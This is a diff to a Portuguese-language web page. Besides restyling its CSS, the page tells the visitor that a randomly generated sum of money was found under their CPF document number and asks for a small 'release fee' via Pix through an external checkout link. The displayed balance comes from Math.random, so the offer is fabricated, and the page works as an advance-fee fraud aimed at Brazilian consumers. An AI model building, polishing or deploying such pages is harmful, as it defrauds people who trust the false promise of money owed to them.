@@ -9,15 +9,15 @@
     html, body {
       margin: 0;
       padding: 0;
-      min-height: 100vh;
-      overflow-x: hidden;
+      min-height: 100vh; /* Cresce se precisar */
+      overflow-x: hidden; /* Só bloqueia rolagem horizontal */
       font-family: Arial, sans-serif;
       background: #f0f2f5;
     }
     header {
       background: #002855;
       color: white;
-      padding: 12px;
+      padding: 15px;
       text-align: center;
     }
     .container {
@@ -27,36 +27,32 @@
       background: white;
       max-width: 600px;
       margin: auto;
-      padding: 20px 15px;
+      padding: 30px 20px;
       box-shadow: 0 0 15px rgba(0,0,0,0.1);
       border-radius: 6px;
       text-align: center;
-      min-height: calc(100vh - 60px); /* ocupa tela toda */
-      justify-content: space-between; /* botão sempre visível */
-    }
-    .conteudo {
-      flex-grow: 1;
     }
     .valor {
       font-size: 32px;
       color: green;
       font-weight: bold;
-      margin: 15px 0;
+      margin: 20px 0;
     }
     .cpf-box {
       font-size: 16px;
       color: #444;
-      margin-bottom: 15px;
+      margin-bottom: 20px;
     }
     .info {
       font-size: 14px;
       color: #555;
       background: #e9ecef;
-      padding: 12px;
+      padding: 15px;
       border-radius: 4px;
-      margin-bottom: 10px;
     }
     .botao {
+      margin-top: 25px;
+      display: inline-block;
       background: #0071bc;
       color: white;
       padding: 15px 25px;
@@ -68,10 +64,15 @@
       text-align: center;
       box-sizing: border-box;
     }
+    /* Ajustes para telas pequenas */
     @media (max-width: 480px) {
-      .valor { font-size: 26px; }
-      .container { padding: 15px 10px; }
-      .botao { font-size: 16px; padding: 12px 20px; }
+      .valor {
+        font-size: 26px;
+      }
+      .botao {
+        font-size: 16px;
+        padding: 12px 20px;
+      }
     }
   </style>
 </head>
@@ -86,16 +87,14 @@
   const valor = (Math.random() * (4979 - 843) + 843).toFixed(2).replace(".", ",");
 
   document.getElementById("conteudo").innerHTML = `
-    <div class="conteudo">
-      <h2>Saldo Encontrado com Sucesso</h2>
-      <div class="cpf-box">Documento consultado: <strong>${doc}</strong></div>
-      <p>Foi localizado um valor disponível no seu nome:</p>
-      <div class="valor">R$ ${valor}</div>
-      <div class="info">
-        Para receber esse valor via Pix, confirme sua identidade e efetue a liberação com uma taxa única de <strong>R$ 5,94</strong>.
-        <br><br>
-        Após a confirmação, o Pix será enviado em até <strong>24h úteis</strong>.
-      </div>
+    <h2>Saldo Encontrado com Sucesso</h2>
+    <div class="cpf-box">Documento consultado: <strong>${doc}</strong></div>
+    <p>Foi localizado um valor disponível no seu nome:</p>
+    <div class="valor">R$ ${valor}</div>
+    <div class="info">
+      Para receber esse valor via Pix, confirme sua identidade e efetue a liberação com uma taxa única de <strong>R$ 5,94</strong>.
+      <br><br>
+      Após a confirmação, o Pix será enviado em até <strong>24h úteis</strong>.
     </div>
     <a class="botao" href="https://pay.safepagoficial.com/checkout/e46f9230-7044-49c3-94bf-ce984b545247" target="_blank">
       Confirmar Liberação via Pix
